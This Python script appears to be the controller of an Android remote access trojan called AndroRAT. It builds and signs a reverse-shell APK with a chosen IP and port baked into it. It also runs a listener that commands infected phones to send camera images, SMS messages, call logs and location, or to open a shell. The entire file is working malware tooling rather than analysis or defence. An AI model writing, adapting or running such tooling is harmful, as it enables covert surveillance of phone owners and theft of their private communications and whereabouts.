import socket
from utils import *
import select
import platform
import argparse
import threading
import sys
import time
import itertools
from colorama import Fore, Style,init

def animate(message):
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        print("\r"+Style.BRIGHT+Fore.GREEN+message+c+Fore.RESET, end="")
        time.sleep(0.1)

parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-d <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('-i','--ip',metavar="<IP>" ,required=True,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,required=True,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
args = parser.parse_args()

clear,direc = clearDirec()

if is_valid_ip(args.ip):
    ip = args.ip
else:
    print(Fore.RED+"Not a valid IP"+Fore.RESET)
    sys.exit()

if is_valid_port(args.port):
    port = int(args.port)
else:
    print(Fore.RED+"Not a valid Port"+Fore.RESET)
    sys.exit()

banner = """
                     _           _____         _______ 
     /\\             | |         |  __ \\     /\\|__   __|
    /  \\   _ __   __| |_ __ ___ | |__) |   /  \\  | |   
   / /\\ \\ | '_ \\ / _` | '__/ _ \\|  _  /   / /\\ \\ | |   
  / ____ \\| | | | (_| | | | (_) | | \\ \\  / ____ \\| |   
 /_/    \\_\\_| |_|\\__,_|_|  \\___/|_|  \\_\\/_/    \\_\\_|   
                                                       
"""
if args.shell:
    soc = socket.socket() 
    soc = socket.socket(type=socket.SOCK_STREAM)
    soc.bind((ip, port))
    soc.listen(2)
    print(Style.BRIGHT+Fore.RED+banner+Fore.RESET)
    while True:
        done=False
        t = threading.Thread(target=animate,args=(" Waiting for Connections ",))
        t.start()
        conn, addr = soc.accept()
        done = True
        t.join()
        clear()
        print(Fore.YELLOW+"Got connection from "+Fore.RED+"".join(str(addr))+Fore.RESET)
        print(" ")
        while True:
            msg = conn.recv(4024).decode("UTF-8")
            if(msg.strip() == "IMAGE"):
                getImage(conn)
            elif("readSMS" in msg.strip()):
                content = msg.strip().split(" ")
                data = content[1]
                readSMS(conn,data)
            elif(msg.strip() == "SHELL"):
                shell(conn)
            elif(msg.strip() == "getLocation"):
                getLocation(conn)
            elif(msg.strip() == "stopVideo123"):
                stopVideo(conn)
            elif(msg.strip() == "stopAudio"):
                stopAudio(conn)
            elif(msg.strip() == "callLogs"):
                callLogs(conn)
            elif(msg.strip() == "help"):
                help()
            else:
                print(msg)
            message_to_send = input(Style.BRIGHT+Fore.CYAN+"Interpreter:/> "+Fore.RESET)+"\n"
            conn.send(message_to_send.encode("UTF-8"))
            if message_to_send.strip() == "exit":
                print(" ")
                print("Bye")
                sys.exit()
            if(message_to_send.strip() == "clear"):clear()


if args.build:
    editor = "Compiled_apk_files"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    port = str(port)
    try:
        file = open(editor,"r").readlines()
        #Very much uncertaninity but cant think any other way to do it xD
        file[16]=file[16][:21]+"\""+ip+"\""+"\n"
        file[21]=file[21][:21]+"\""+port+"\""+"\n"
        str_file="".join([str(elem) for elem in file])
        open(editor,"w").write(str_file)
    except Exception as e:
        print(e)
        sys.exit()
    java_version = executeCMD("java -version")
    if java_version.stderr == "":
        print(Style.BRIGHT+Fore.RED+"\nJava Not Installed"+Fore.RESET)
    else:
        print(Style.BRIGHT+Fore.YELLOW+"\nGenerating apk file"+Fore.RESET)
        if args.output:
            outFileName = args.output
        else:
            outFileName = "karma.apk"
        done=False
        t = threading.Thread(target=animate,args=("Building ",))
        t.start()
        resOut = executeCMD("java -jar Jar_Files/apktool.jar b Compiled_apk_files  -o "+outFileName)
        done = True
        t.join()
        if not resOut.returncode:
            print(Style.BRIGHT+Fore.GREEN+"\rSuccessfully apk built "+getpwd(outFileName)+"\n"+Fore.RESET,end="")
            print(Style.BRIGHT+Fore.YELLOW+"\nSigning the apk"+Fore.RESET)
            done=False
            t = threading.Thread(target=animate,args=("Signing ",))
            t.start()
            resOut = executeCMD("java -jar Jar_Files/sign.jar "+outFileName+" --override")
            done = True
            t.join()
            if not resOut.returncode:
                print(Fore.GREEN+"\rSuccessfully signed the apk "+outFileName+Fore.RESET,end="")
                print(" ")
            else:
                print("\r"+resOut.stderr)
                print(Fore.RED+"Signing Failed"+Fore.RESET)    
        else:
            print("\r"+resOut.stderr)
            print(Fore.RED+"Building Failed"+Fore.RESET)